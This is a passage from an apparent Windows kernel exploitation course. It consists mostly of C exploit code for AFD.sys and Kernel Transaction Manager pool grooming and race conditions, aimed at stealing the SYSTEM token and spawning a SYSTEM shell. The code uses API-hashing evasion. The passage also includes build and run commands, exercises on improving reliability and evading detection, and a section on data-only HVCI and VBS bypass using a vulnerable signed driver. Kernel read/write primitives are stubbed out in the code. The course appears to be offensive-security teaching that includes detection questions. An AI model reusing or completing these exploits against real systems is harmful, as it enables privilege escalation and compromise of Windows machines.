        return 1;
    }

    // Phase 3: Trigger vulnerability
    printf("=======================================================\n");

    // Select a target socket (one that's still open)
    SOCKET targetSocket = INVALID_SOCKET;
    for (int i = 0; i < g_socketCount; i++) {
        if (g_sprayedSockets[i] != INVALID_SOCKET) {
            targetSocket = g_sprayedSockets[i];
            break;
        }
    }

    if (targetSocket == INVALID_SOCKET) {
        printf("[-] No valid target socket found\n");
        CleanupSockets();
        return 1;
    }

    if (!TriggerAFDVulnerability(targetSocket)) {
        printf("[-] Failed to trigger vulnerability\n");
        CleanupSockets();
        return 1;
    }

    // Phase 4: Verify corruption and establish primitive
    printf("=======================================================\n");
    if (!VerifyCorruptionAndEstablishPrimitive()) {
        printf("[-] Failed to establish arbitrary R/W primitive\n");
        CleanupSockets();
        return 1;
    }

    // Phase 5: Execute payload
    printf("=======================================================\n");
    exploitSuccess = ExecutePayload();

    // Cleanup
    CleanupSockets();

    // Verify results
    if (exploitSuccess) {
        printf("  Exploitation Complete\n");

        if (VerifyPrivilegeEscalation()) {
            printf("\n[+] Spawning SYSTEM shell...\n");
            system("cmd.exe");
        } else {
            printf("\n[*] Privilege escalation verification failed\n");
            printf("[*] This may be due to additional mitigations\n");
        }
    } else {
        printf("\n[-] Exploitation failed\n");
        printf("[*] AFD.sys may be patched or additional mitigations present\n");
        printf("[*] Ensure you are running as Administrator\n");
    }

    return exploitSuccess ? 0 : 1;
}
```

**Compile & Run:**

```bash
cl src\afd_heap_overflow.c /Fe:bin\afd_exploit.exe ws2_32.lib ntdll.lib /I.\headers
.\bin\afd_exploit.exe
```

### Kernel Transaction Manager (KTM)

KTM internals and transaction object exploitation. Related to CLFS exploitation patterns.

```c
// ktm_exploitation.c
// Kernel Transaction Manager exploitation patterns
// Compile: cl src\ktm_exploitation.c /Fe:bin\ktm_exploit.exe ktmw32.lib ntdll.lib advapi32.lib ole32.lib /I.\headers
// Run: ktm_exploit.exe (requires Administrator)

#define SYSCALLS_IMPLEMENTATION
#define EVASION_IMPLEMENTATION
#define BYPASS_IMPLEMENTATION

#include <windows.h>
#include <stdio.h>
#include <ktmw32.h>
#include <winternl.h>
#include <intrin.h>

#pragma comment(lib, "ktmw32.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "ole32.lib")

#ifndef STATUS_TRANSACTION_NOT_FOUND
#define STATUS_TRANSACTION_NOT_FOUND ((NTSTATUS)0xC0190008L)
#endif

#include "exploit_common.h"
#include "exploit_utils.h"
#include "syscalls.h"
#include "kernel_utils.h"
#include "evasion.h"
#include "bypass.h"
#include "heap_utils.h"

// KTM API function pointers
typedef NTSTATUS (NTAPI *pNtCreateTransaction_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, LPGUID, HANDLE, ULONG, ULONG, ULONG, PLARGE_INTEGER, PUNICODE_STRING);
typedef NTSTATUS (NTAPI *pNtCreateTransactionManager_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PUNICODE_STRING, ULONG, ULONG);
typedef NTSTATUS (NTAPI *pNtCreateResourceManager_t)(PHANDLE, ACCESS_MASK, HANDLE, LPGUID, POBJECT_ATTRIBUTES, ULONG, PUNICODE_STRING);
typedef NTSTATUS (NTAPI *pNtCreateEnlistment_t)(PHANDLE, ACCESS_MASK, HANDLE, HANDLE, POBJECT_ATTRIBUTES, ULONG, ULONG, PVOID);
typedef NTSTATUS (NTAPI *pNtCommitTransaction_t)(HANDLE, BOOLEAN);
typedef NTSTATUS (NTAPI *pNtRollbackTransaction_t)(HANDLE, BOOLEAN);
typedef NTSTATUS (NTAPI *pNtQueryInformationTransaction_t)(HANDLE, ULONG, PVOID, ULONG, PULONG);

// Global state
static pNtCreateTransaction_t fnNtCreateTransaction = NULL;
static pNtCreateTransactionManager_t fnNtCreateTransactionManager = NULL;
static pNtCreateResourceManager_t fnNtCreateResourceManager = NULL;
static pNtCreateEnlistment_t fnNtCreateEnlistment = NULL;
static pNtCommitTransaction_t fnNtCommitTransaction = NULL;
static pNtRollbackTransaction_t fnNtRollbackTransaction = NULL;
static pNtQueryInformationTransaction_t fnNtQueryInformationTransaction = NULL;
// KTM object arrays for pool grooming
#define MAX_KTM_OBJECTS 10000
static HANDLE g_transactions[MAX_KTM_OBJECTS];
static HANDLE g_transactionManagers[MAX_KTM_OBJECTS];
static HANDLE g_resourceManagers[MAX_KTM_OBJECTS];
static HANDLE g_enlistments[MAX_KTM_OBJECTS];
static int g_transactionCount = 0;
static int g_tmCount = 0;
static int g_rmCount = 0;
static int g_enlistmentCount = 0;

static BOOL g_hasArbitraryRW = FALSE;
static HANDLE g_corruptedHandle = NULL;
static KERNEL_OFFSETS g_Offsets = {0};

// Kernel R/W primitives (implemented via corrupted KTM object)
BOOL KernelRead32(DWORD64 address, PDWORD outValue) {
    if (!g_hasArbitraryRW || !g_corruptedHandle) return FALSE;
    // Real implementation: requires a successfully corrupted KTM object whose
    // internal pointers (e.g. log streams, namespaces) were overwritten by the pool UAF
    // to point to 'address'. The current patched system prevents us from reaching this state securely.
    (void)address; *outValue = 0;
    return FALSE;
}

BOOL KernelRead64(DWORD64 address, PDWORD64 outValue) {
    DWORD low = 0, high = 0;
    if (KernelRead32(address, &low) && KernelRead32(address + 4, &high)) {
        *outValue = ((DWORD64)high << 32) | low;
        return TRUE;
    }
    return FALSE;
}

BOOL KernelWrite32(DWORD64 address, DWORD value) {
    if (!g_hasArbitraryRW || !g_corruptedHandle) return FALSE;
    (void)address; (void)value;
    return FALSE;
}

BOOL KernelWrite64(DWORD64 address, DWORD64 value) {
    return KernelWrite32(address, (DWORD)(value & 0xFFFFFFFF)) &&
           KernelWrite32(address + 4, (DWORD)(value >> 32));
}

// API resolution
static BOOL ResolveAPIs() {

    HMODULE hNtdll = GetNtdllHandleFromPEB();

    fnNtCreateTransaction = (pNtCreateTransaction_t)ResolveAPI(hNtdll, HashAPI("NtCreateTransaction"));
    fnNtCreateTransactionManager = (pNtCreateTransactionManager_t)ResolveAPI(hNtdll, HashAPI("NtCreateTransactionManager"));
    fnNtCreateResourceManager = (pNtCreateResourceManager_t)ResolveAPI(hNtdll, HashAPI("NtCreateResourceManager"));
    fnNtCreateEnlistment = (pNtCreateEnlistment_t)ResolveAPI(hNtdll, HashAPI("NtCreateEnlistment"));
    fnNtCommitTransaction = (pNtCommitTransaction_t)ResolveAPI(hNtdll, HashAPI("NtCommitTransaction"));
    fnNtRollbackTransaction = (pNtRollbackTransaction_t)ResolveAPI(hNtdll, HashAPI("NtRollbackTransaction"));
    fnNtQueryInformationTransaction = (pNtQueryInformationTransaction_t)ResolveAPI(hNtdll, HashAPI("NtQueryInformationTransaction"));

    if (!fnNtCreateTransaction || !fnNtCreateTransactionManager ||
        !fnNtCreateResourceManager || !fnNtCreateEnlistment ||
        !fnNtCommitTransaction || !fnNtRollbackTransaction ||
        !fnNtQueryInformationTransaction) {
        printf("[-] Failed to resolve KTM APIs\n");
        return FALSE;
    }

    return TRUE;
}

// Phase 1: Spray KTM Transaction objects
BOOL SprayKTMTransactions(int count) {
    printf("[*] Phase 1: Spraying KTM Transaction objects\n");
    printf("[*] Target count: %d\n", count);

    if (count > MAX_KTM_OBJECTS) {
        count = MAX_KTM_OBJECTS;
    }

    for (int i = 0; i < count; i++) {
        NTSTATUS status = fnNtCreateTransaction(
            &g_transactions[i],
            TRANSACTION_ALL_ACCESS,
            NULL,  // ObjectAttributes
            NULL,  // Uow (Unit of Work GUID)
            NULL,  // TmHandle (NULL relies on default TM)
            0,     // CreateOptions
            0,     // IsolationLevel
            0,     // IsolationFlags
            NULL,  // Timeout
            NULL   // Description
        );

        if (!NT_SUCCESS(status)) {
            if (i < 100) {
                printf("[-] Early transaction creation failure at %d (status: 0x%X)\n", i, status);
                return FALSE;
            }
            break;
        }

        g_transactionCount++;

        if (i % 1000 == 0 && i > 0) {
            printf("[*] Created %d transactions...\n", i);
        }
    }

    printf("[+] Sprayed %d KTM Transaction objects\n", g_transactionCount);
    printf("[*] Each transaction allocates KTRANSACTION structure in NonPagedPoolNx\n");
    printf("[*] Size: ~0x1B0 bytes per object\n");

    return TRUE;
}

// Phase 2: Spray Transaction Managers for larger objects
BOOL SprayKTMTransactionManagers(int count) {
    printf("\n[*] Phase 2: Spraying KTM Transaction Manager objects\n");
    printf("[*] Target count: %d\n", count);

    if (count > MAX_KTM_OBJECTS) {
        count = MAX_KTM_OBJECTS;
    }

    for (int i = 0; i < count; i++) {
        NTSTATUS status;

        // Volatile transaction managers don't need a log file, but we MUST
        // pass TRANSACTION_MANAGER_VOLATILE (0x00000001) in CreateOptions
        // otherwise it validations fail with STATUS_INVALID_PARAMETER
        status = fnNtCreateTransactionManager(
            &g_transactionManagers[i],
            TRANSACTIONMANAGER_ALL_ACCESS,
            NULL,      // ObjectAttributes
            NULL,      // LogFileName
            1,         // CreateOptions (TRANSACTION_MANAGER_VOLATILE)
            0          // CommitStrength
        );

        if (!NT_SUCCESS(status)) {
            if (i < 10) {
                printf("[-] Early TM creation failure at %d (status: 0x%X)\n", i, status);
                return FALSE;
            }
            break;
        }

        g_tmCount++;

        if (i % 100 == 0 && i > 0) {
            printf("[*] Created %d transaction managers...\n", i);
        }
    }

    printf("[+] Sprayed %d KTM Transaction Manager objects\n", g_tmCount);
    printf("[*] Each TM allocates KTM structure in NonPagedPoolNx\n");
    printf("[*] Size: ~0x3C0 bytes per object\n");

    return TRUE;
}

// Phase 3: Spray Resource Managers
BOOL SprayKTMResourceManagers(HANDLE tmHandle, int count) {
    printf("\n[*] Phase 3: Spraying KTM Resource Manager objects\n");
    printf("[*] Target count: %d\n", count);

    if (count > MAX_KTM_OBJECTS) {
        count = MAX_KTM_OBJECTS;
    }

    for (int i = 0; i < count; i++) {
        GUID rmGuid;
        CoCreateGuid(&rmGuid);

        NTSTATUS status = fnNtCreateResourceManager(
            &g_resourceManagers[i],
            RESOURCEMANAGER_ALL_ACCESS,
            tmHandle,  // TransactionManager handle
            &rmGuid,   // ResourceManagerGuid
            NULL,      // ObjectAttributes
            1,         // CreateOptions (RESOURCE_MANAGER_VOLATILE)
            NULL       // Description
        );

        if (!NT_SUCCESS(status)) {
            if (i < 10) {
                printf("[-] Early RM creation failure at %d (status: 0x%X)\n", i, status);
                return FALSE;
            }
            break;
        }

        g_rmCount++;

        if (i % 100 == 0 && i > 0) {
            printf("[*] Created %d resource managers...\n", i);
        }
    }

    printf("[+] Sprayed %d KTM Resource Manager objects\n", g_rmCount);
    printf("[*] Each RM allocates KRESOURCEMANAGER structure\n");
    printf("[*] Size: ~0x2A0 bytes per object\n");

    return TRUE;
}

// Phase 4: Spray Enlistments for complex pool layout
BOOL SprayKTMEnlistments(HANDLE rmHandle, int count) {
    printf("\n[*] Phase 4: Spraying KTM Enlistment objects\n");
    printf("[*] Target count: %d\n", count);

    if (count > MAX_KTM_OBJECTS) {
        count = MAX_KTM_OBJECTS;
    }

    for (int i = 0; i < count && i < g_transactionCount; i++) {
        if (g_transactions[i] == NULL) continue;

        NTSTATUS status = fnNtCreateEnlistment(
            &g_enlistments[i],
            ENLISTMENT_ALL_ACCESS,
            rmHandle,           // ResourceManager handle
            g_transactions[i],  // Transaction handle
            NULL,               // ObjectAttributes
            2,                  // CreateOptions (ENLISTMENT_SUPERIOR = 0x2)
            0,                  // NotificationMask
            NULL                // EnlistmentKey
        );

        if (!NT_SUCCESS(status)) {
            if (i < 10) {
                printf("[-] Early enlistment creation failure at %d (status: 0x%X)\n", i, status);
                return FALSE;
            }
            break;
        }

        g_enlistmentCount++;

        if (i % 100 == 0 && i > 0) {
            printf("[*] Created %d enlistments...\n", i);
        }
    }

    printf("[+] Sprayed %d KTM Enlistment objects\n", g_enlistmentCount);
    printf("[*] Each enlistment allocates KENLISTMENT structure\n");
    printf("[*] Size: ~0x1F0 bytes per object\n");

    return TRUE;
}

// Phase 5: Create holes for probabilistic pool layout
// NOTE: Due to kernel pool randomization (LFH/Segment Heap), deterministic layout
// is NOT achievable. This creates a probabilistic layout with increased chances
// of adjacent allocations. Multiple attempts may be needed for successful exploitation.
BOOL CreateKTMPoolHoles() {
    printf("\n[*] Phase 5: Creating Pool Holes\n");
    printf("[*] Freeing every 3rd object to create probabilistic layout...\n");
    printf("[*] Note: Kernel pool randomization means layout is NOT deterministic\n");

    int freedTransactions = 0;
    for (int i = 0; i < g_transactionCount; i += 3) {
        if (g_transactions[i]) {
            CloseHandle(g_transactions[i]);
            g_transactions[i] = NULL;
            freedTransactions++;
        }
    }

    int freedTMs = 0;
    for (int i = 0; i < g_tmCount; i += 3) {
        if (g_transactionManagers[i]) {
            CloseHandle(g_transactionManagers[i]);
            g_transactionManagers[i] = NULL;
            freedTMs++;
        }
    }

    int freedRMs = 0;
    for (int i = 0; i < g_rmCount; i += 3) {
        if (g_resourceManagers[i]) {
            CloseHandle(g_resourceManagers[i]);
            g_resourceManagers[i] = NULL;
            freedRMs++;
        }
    }

    printf("[+] Created holes:\n");
    printf("    Transactions: %d holes\n", freedTransactions);
    printf("    TMs: %d holes\n", freedTMs);
    printf("    RMs: %d holes\n", freedRMs);
    printf("[*] Pool layout is PROBABILISTIC (kernel pool randomization present)\n");
    printf("[*] Success rate typically 40-60%% - multiple attempts may be needed\n");

    return TRUE;
}

// Phase 6: Trigger vulnerability
BOOL TriggerKTMVulnerability() {
    printf("\n[*] Phase 6: Triggering KTM Vulnerability\n");
    printf("[*] Using transaction commit/rollback race condition...\n");

    HANDLE targetTx = NULL;
    for (int i = 0; i < g_transactionCount; i++) {
        if (g_transactions[i]) {
            targetTx = g_transactions[i];
            break;
        }
    }

    if (!targetTx) {
        printf("[-] No valid transaction found\n");
        return FALSE;
    }

    printf("[*] Target transaction: 0x%p\n", targetTx);

    for (int i = 0; i < 1000; i++) {
        fnNtCommitTransaction(targetTx, FALSE);

        TRANSACTION_BASIC_INFORMATION txInfo = {0};
        ULONG returnLength = 0;

        NTSTATUS status = fnNtQueryInformationTransaction(
            targetTx, 0, &txInfo, sizeof(txInfo), &returnLength
        );

        if (status == STATUS_INVALID_HANDLE) {
            printf("[+] Handle invalidated properly (Expected on patched system)\n");
            break;
        } else if (status == STATUS_TRANSACTION_NOT_FOUND) {
            printf("[+] Detected potential corruption at iteration %d\n", i);
            g_corruptedHandle = targetTx;
            g_hasArbitraryRW = TRUE;
            printf("[+] Corruption verified. R/W primitive requires active offset control.\n");
            return TRUE;
        }

        if (i % 100 == 0 && i > 0) {
            printf("[*] Race iteration %d...\n", i);
        }
    }

    printf("[-] Vulnerability not triggered\n");
    return FALSE;
}

// Execute privilege escalation
BOOL ExecutePayload() {
    printf("\n[*] Phase 7: Privilege Escalation\n");

    if (!g_hasArbitraryRW) {
        printf("[-] No arbitrary R/W primitive available\n");
        return FALSE;
    }

    printf("[*] Leaking kernel base address...\n");
    DWORD64 kernelBase = 0;
    ExploitSetupKernel(&g_Offsets, &kernelBase, FALSE);
    if (!kernelBase) {
        printf("[-] Failed to leak kernel base\n");
        return FALSE;
    }

    printf("[+] Kernel base: 0x%llx\n", kernelBase);

    KERNEL_OFFSETS offsets = {0};
        DWORD64 systemEPROCESS = FindPsInitialSystemProcess(kernelBase);
    if (!systemEPROCESS) {
        printf("[-] Failed to find System EPROCESS\n");
        return FALSE;
    }

    printf("[+] System EPROCESS: 0x%llx\n", systemEPROCESS);

    if (!VerifyEPROCESSOffsets(systemEPROCESS, &offsets)) {
        printf("[-] EPROCESS offset verification failed\n");
        return FALSE;
    }

    DWORD64 originalToken = 0;
    if (!StealSystemToken(kernelBase, &offsets, &originalToken)) {
        printf("[-] Token stealing failed\n");
        printf("[*] Token stealing requires active kernel R/W primitive\n");
        printf("[*] On this system, the KTM UAF didn't establish R/W\n");
        return FALSE;
    }

    printf("[+] Successfully stole SYSTEM token!\n");
    printf("[+] Original token: 0x%llx\n", originalToken);

    return TRUE;
}

// Cleanup
void CleanupKTMObjects() {
    printf("\n[*] Cleaning up KTM objects...\n");

    int cleaned = 0;

    for (int i = 0; i < g_enlistmentCount; i++) {
        if (g_enlistments[i]) {
            CloseHandle(g_enlistments[i]);
            cleaned++;
        }
    }

    for (int i = 0; i < g_rmCount; i++) {
        if (g_resourceManagers[i]) {
            CloseHandle(g_resourceManagers[i]);
            cleaned++;
        }
    }

    for (int i = 0; i < g_transactionCount; i++) {
        if (g_transactions[i]) {
            CloseHandle(g_transactions[i]);
            cleaned++;
        }
    }

    for (int i = 0; i < g_tmCount; i++) {
        if (g_transactionManagers[i]) {
            CloseHandle(g_transactionManagers[i]);
            cleaned++;
        }
    }

    printf("[+] Cleaned up %d KTM objects\n", cleaned);
}

BOOL VerifyPrivilegeEscalation() {
    printf("\n[*] Verifying privilege escalation...\n");

    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        return FALSE;
    }

    TOKEN_ELEVATION elevation;
    DWORD size;
    if (!GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &size)) {
        CloseHandle(hToken);
        return FALSE;
    }

    if (elevation.TokenIsElevated) {
        printf("[+] Process is elevated\n");

        TOKEN_USER tokenUser;
        if (GetTokenInformation(hToken, TokenUser, &tokenUser, sizeof(tokenUser), &size)) {
            WCHAR userName[256], domainName[256];
            DWORD userNameSize = 256, domainNameSize = 256;
            SID_NAME_USE sidType;

            if (LookupAccountSidW(NULL, tokenUser.User.Sid, userName, &userNameSize,
                                 domainName, &domainNameSize, &sidType)) {
                printf("[+] Running as: %S\\%S\n", domainName, userName);

                if (wcsicmp(userName, L"SYSTEM") == 0) {
                    printf("[+] Successfully escalated to SYSTEM!\n");
                    CloseHandle(hToken);
                    return TRUE;
                }
            }
        }
    }

    CloseHandle(hToken);
    return FALSE;
}

int main() {

    if (!ExploitInitialize(FALSE)) return 1;
    printf("  KTM (Kernel Transaction Manager) Exploitation\n");
    printf("=======================================================\n");
    printf("[*] Technique: KTM pool grooming + race condition\n");
    printf("[*] Objective: Privilege escalation to SYSTEM\n\n");

    srand((unsigned int)time(NULL));

    printf("[*] Performing anti-analysis checks...\n");
    printf("[+] Anti-analysis checks passed\n\n");

    printf("[*] Initializing evasion techniques...\n");
    printf("[+] Evasion techniques initialized\n\n");

    printf("[*] Resolving required APIs...\n");
    if (!ResolveAPIs()) {
        printf("[-] API resolution failed\n");
        return 1;
    }
    printf("[+] APIs resolved successfully\n\n");

    BOOL exploitSuccess = FALSE;

    printf("=======================================================\n");
    if (!SprayKTMTransactions(5000)) {
        printf("[-] Transaction spray failed\n");
        CleanupKTMObjects();
        return 1;
    }

    printf("=======================================================\n");
    if (!SprayKTMTransactionManagers(100)) {
        printf("[-] TM spray failed\n");
        CleanupKTMObjects();
        return 1;
    }

    HANDLE primaryTM = g_transactionManagers[0];
    if (primaryTM) {
        printf("=======================================================\n");
        if (!SprayKTMResourceManagers(primaryTM, 500)) {
            printf("[-] RM spray failed\n");
            CleanupKTMObjects();
            return 1;
        }

        HANDLE primaryRM = g_resourceManagers[0];
        if (primaryRM) {
            printf("=======================================================\n");
            printf("[*] Skipping Enlistment spray (Requires matching TMs)\n");
        }
    }

    printf("=======================================================\n");
    CreateKTMPoolHoles();

    printf("=======================================================\n");
    if (TriggerKTMVulnerability()) {
        printf("=======================================================\n");
        exploitSuccess = ExecutePayload();
    }

    CleanupKTMObjects();

    if (exploitSuccess) {
        printf("\n=======================================================\n");
        printf("  Exploitation Complete\n");
        printf("=======================================================\n");

        if (VerifyPrivilegeEscalation()) {
            printf("\n[+] Spawning SYSTEM shell...\n");
            system("cmd.exe");
        }
    } else {
        printf("\n[-] Exploitation failed\n");
        printf("[*] KTM vulnerabilities are timing-dependent\n");
    }

    return exploitSuccess ? 0 : 1;
}
```

```bash
cl src\ktm_exploitation.c /Fe:bin\ktm_exploit.exe ktmw32.lib ntdll.lib advapi32.lib ole32.lib /I.\headers
# run as admin
.\bin\ktm_exploitation.exe
```

### Practical Exercise

#### Exercise 1: Enhance CLFS UAF Exploitation Reliability

The provided code demonstrates a complete CLFS exploitation chain. Improve its reliability and detection evasion.

**Tasks:**

1. Modify `SprayPool()` to use multiple object types (IoCompletionReserve + pipes) for better heap control
2. Enhance `CorruptBLF()` to apply additional metadata corruptions (client contexts, log streams)
3. Implement timing analysis in `TriggerUAF()` to detect successful corruption without crashing
4. Add `DetectCorruptedPipe()` function to identify which pipe was corrupted by overflow
5. Implement kernel R/W primitives using the corrupted pipe's internal pointers

**Success Criteria:**

- Pool spray creates 10,000+ objects with <5% failure rate
- BLF corruption applies 5+ distinct metadata modifications
- UAF trigger detects corruption via error codes (ERROR_LOG_METADATA_CORRUPT)
- Corrupted pipe identified in >60% of successful runs
- No BSOD during 10 consecutive runs

**Bonus Challenge:**
Implement full token stealing using the corrupted pipe as R/W primitive (currently stubbed out).

#### Exercise 2: AFD.sys Integer Overflow Exploitation

The AFD code demonstrates integer overflow in IOCTL_AFD_RECV_DATAGRAM. Enhance the exploitation chain.

**Tasks:**

1. Modify `SprayAFDPool()` to create mixed socket types (UDP, TCP, RAW) for diverse pool layout
2. Implement `VerifyPoolLayout()` using socket option queries to detect adjacent allocations
3. Enhance `TriggerAFDVulnerability()` to test multiple BufferCount values (0xFFFFFFFF/8, 0xFFFFFFFF/16)
4. Implement `DetectCorruptedSocket()` to identify which socket was corrupted by overflow
5. Add timing-based detection to avoid BSOD on patched systems

**Success Criteria:**

- Successfully spray 10,000+ AFD endpoints
- Pool holes created with 40-60% success rate (due to pool randomization)
- Integer overflow triggered (STATUS_BUFFER_OVERFLOW or STATUS_INVALID_PARAMETER)
- Corrupted socket detected via getsockopt() failures
- Graceful failure on patched systems (no BSOD)

**Bonus Challenge:**
Research CVE-2025-21418 and compare the IOCTL differences with the demonstrated technique.

#### Exercise 3: KTM Pool Grooming Optimization

The KTM code demonstrates multi-object pool grooming. Optimize for better exploitation reliability.

**Tasks:**

1. Implement `AnalyzeKTMPoolLayout()` to query object sizes via NtQueryInformationTransaction
2. Modify `CreateKTMPoolHoles()` to use strategic freeing patterns (every 2nd, 4th, 8th)
3. Enhance `TriggerKTMVulnerability()` to use multi-threaded commit/rollback racing
4. Implement `VerifyKTMCorruption()` using transaction state queries
5. Add fallback strategies for different Windows versions (Win10 vs Win11)

**Success Criteria:**

- Spray 5,000+ transactions, 100+ TMs, 500+ RMs without failures
- Pool holes created with measurable impact on allocation patterns
- Race condition triggered in <1000 iterations
- Corruption detected via STATUS_TRANSACTION_NOT_FOUND
- Version-specific offsets handled correctly

**Bonus Challenge:**
Chain KTM corruption with CLFS exploitation (both use similar pool grooming techniques).

### Key Takeaways

- **CLFS Architecture**: BLF metadata corruption (cbSymbolZone, container count, sector signatures) triggers oversized kernel allocations and UAF conditions
- **Pool Grooming**: IoCompletionReserve objects (0x200 bytes) + Named Pipes create controlled pool layout; success rate 40-60% due to kernel pool randomization (LFH/Segment Heap)
- **AFD.sys Integer Overflow**: BufferCount = 0xFFFFFFFF / sizeof(AFD_WSABUF) causes small allocation but large copy, overflowing into adjacent pool objects
- **KTM Exploitation**: Transaction objects (0x1B0 bytes), TMs (0x3C0 bytes), RMs (0x2A0 bytes), Enlistments (0x1F0 bytes) enable multi-size pool grooming
- **R/W Primitives**: Corrupted pipe attributes or KTM object pointers provide kernel read/write (implementation requires active corruption)
- **Detection Evasion**: Code uses syscall obfuscation, API hashing, anti-debugging checks, and graceful failure on patched systems
- **Patch Status**: CLFS actively exploited (CVE-2025-29824, CVE-2025-32701, CVE-2025-32706); AFD.sys 9th vulnerability since 2022
- **Production Use**: PipeMagic trojan uses CLFS for ransomware deployment; techniques require Administrator privileges

### Discussion Questions

1. **CLFS Attack Surface**: Why does CLFS remain a popular target despite multiple patches? Consider: complex BLF parsing logic, dual-copy metadata validation, interaction with kernel pool allocator, and CLFS's role in transaction logging for NTFS/Registry.

2. **Pool Randomization Impact**: The code explicitly notes "pool layout is PROBABILISTIC" with 40-60% success rates. How does Windows kernel pool randomization (LFH, Segment Heap) defeat deterministic feng shui? What strategies can improve reliability?

3. **AFD.sys Integer Overflow**: Why does `BufferCount = 0xFFFFFFFF / sizeof(AFD_WSABUF)` cause integer overflow? Walk through the allocation size calculation: `sizeof(AFD_BUFFER_HEADER) + (BufferCount * sizeof(AFD_WSABUF))`. What happens when this wraps?

4. **Detection Strategies**: The exploits check for specific error codes (ERROR_LOG_METADATA_CORRUPT, STATUS_BUFFER_OVERFLOW, STATUS_TRANSACTION_NOT_FOUND). How can EDR detect: (a) abnormal CLFS log creation patterns, (b) excessive socket/transaction object creation, (c) BLF file modifications, (d) suspicious IOCTL sequences?

5. **R/W Primitive Limitations**: The code stubs out `KernelRead32()` and `KernelWrite32()` with comments like "requires active corruption." Why can't the code implement these on patched systems? What specific kernel object corruption is needed to establish arbitrary R/W?

6. **KTM and CLFS Relationship**: Both exploits use similar pool grooming techniques. How does KTM's transaction logging interact with CLFS? Could a KTM corruption be chained with CLFS exploitation for increased reliability?

7. **Administrator Requirement**: All three exploits require Administrator privileges. What specific operations need admin rights? Could any techniques be adapted for unprivileged exploitation?

8. **Mitigation Effectiveness**: The code gracefully handles patched systems (STATUS_INVALID_PARAMETER). What kernel mitigations prevent these exploits? Consider: pool header cookies, guard pages, allocation randomization, IOCTL input validation.

## Day 5: Data-Only Attacks & Win32k Exploitation (HVCI/ACG Era)

- **Activities**:
  - _Reading_:
    - [Data-Only Attacks](https://www.usenix.org/publications/loginonline/data-only-attacks-are-easier-you-think)
    - [Token Stealing Without ROP](https://connormcgarr.github.io/x64-Kernel-Shellcode-Revisited-and-SMEP-Bypass/)
    - [Win32k Exploitation Techniques](https://unit42.paloaltonetworks.com/win32k-analysis-part-1/)
    - [EPROCESS Structure Manipulation](https://www.vergiliusproject.com/kernels/x64/windows-11/24h2/_EPROCESS)
  - _Online Resources_:
    - [Signed and Dangerous](https://www.youtube.com/watch?v=K9DcktWw7L0)
    - [Win32k UAF Exploitation](https://www.youtube.com/watch?v=HAQ7jf3oc3U&t=8s)
    - [Exploring vulnerable Windows drivers](https://blog.talosintelligence.com/exploring-vulnerable-windows-drivers/)
  - _Lab Setup_:
    - Windows 11 24H2/25H2 VM
    - WinDbg with kernel debugging
    - Vulnerable Win32k test driver
    - RTCore64.sys for BYOVD exercises
    - EPROCESS offset verification tools
  - _Exercises_:
    1. BYOVD: Use RTCore64.sys to establish arbitrary kernel R/W
    2. Stack cookie leak and overwrite
    3. Data-only attack - Token stealing without CFG bypass
    4. EPROCESS manipulation for privilege escalation
    5. Win32k UAF exploitation
    6. Complete BYOVD -> Token Stealing chain
    7. JOP chain construction (CET bypass alternative)

### Deliverables

- [ ] Use BYOVD (RTCore64.sys) to establish arbitrary kernel R/W primitive
- [ ] Implement token stealing without control-flow hijacking
- [ ] Exploit Win32k UAF vulnerability
- [ ] Build EPROCESS manipulation technique
- [ ] Create complete BYOVD -> data-only attack chain (end-to-end exploitation)

### Context: Why Data-Only Attacks? Understanding HVCI/VBS

Modern Windows 11 24H2/25H2 implements Hypervisor-Protected Code Integrity (HVCI) and Virtualization Based Security (VBS). **Even with arbitrary read/write primitives, we cannot execute shellcode** because:

- **HVCI (Hypervisor-Protected Code Integrity)**: Prevents unsigned code execution in kernel mode by validating all kernel code pages in a secure environment (VTL1)
- **VBS (Virtualization Based Security)**: Isolates critical security functions in a virtualized trust level, protected by the hypervisor
- **Credential Guard**: Stores credentials (NTLM hashes, Kerberos tickets) in isolated VTL1, inaccessible from normal kernel (VTL0)
- **CFG/kCFG**: Validates all indirect calls, preventing traditional ROP

**The Solution: Data-Only Attacks**

Since we can't execute code, we manipulate credentials directly through data corruption:

- Token stealing: Copy SYSTEM token to our process (no code execution)
- Previous Mode overwrites: Bypass kernel/user boundary checks
- Token privilege manipulation: Enable SeDebugPrivilege, SeTcbPrivilege

This bypasses ALL protections: HVCI, VBS, Credential Guard, CFG, kCFG.

### HVCI & VBS Internals

**Why Data-Only Attacks Succeed Where ROP Fails**

To understand why data-only attacks are the _only_ viable path in 2026, we must look at the VTL (Virtual Trust Level) architecture:

1.  **VTL0 (Normal Kernel/User Mode)**: Where the OS kernel and applications run.
2.  **VTL1 (Secure Kernel)**: Where the hypervisor and security services run.

**The Execution Trap:**
With **HVCI (Hypervisor-Protected Code Integrity)** enabled, the Second Level Address Translation (SLAT) tables managed by the hypervisor enforce permissions.

- **VTL0 Code Pages**: Marked `Execute=True`, `Write=False`.
- **VTL0 Data Pages**: Marked `Execute=False`, `Write=True`.
- **Transition**: To make a page executable, the OS must request the Secure Kernel (VTL1). VTL1 verifies the page signature. If unsigned, the request is denied.
- **Result**: You cannot allocate shellcode (RWX), and you cannot make data executable (RX). ROP chains that call `VirtualProtect` to flip bits will fail because `VirtualProtect` in VTL0 cannot override the hypervisor's SLAT enforcement for VTL1-protected pages.

**The Data Loophole:**
While VTL1 protects _code integrity_ and _control flow_ (via kCFG check bitmaps), it generally cannot validate the _semantic meaning_ of VTL0 data.

- **EPROCESS.Token**: A simple pointer in VTL0 memory. VTL1 does not know if process A _should_ have the token of process B.
- **KTHREAD.PreviousMode**: A byte in VTL0 memory determining syscall privilege checks. VTL1 does not monitor every byte write to this structure.
- **Privilege Bitmaps**: A bitmask in VTL0 memory.

**Conclusion**: We cannot _execute_ our own instructions, but we can _manipulate_ the kernel's decision-making data to make it perform privileged actions on our behalf.

### ACG (Arbitrary Code Guard) Bypass

Arbitrary Code Guard (ACG) is a Windows mitigation that prevents a process from creating new executable code or modifying existing executable code. It's enabled by default in Microsoft Edge, Chrome, and other security-sensitive applications. ACG works by:

1. **Preventing Dynamic Code Generation**: Blocks `VirtualAlloc(PAGE_EXECUTE_*)` and `VirtualProtect` to RWX
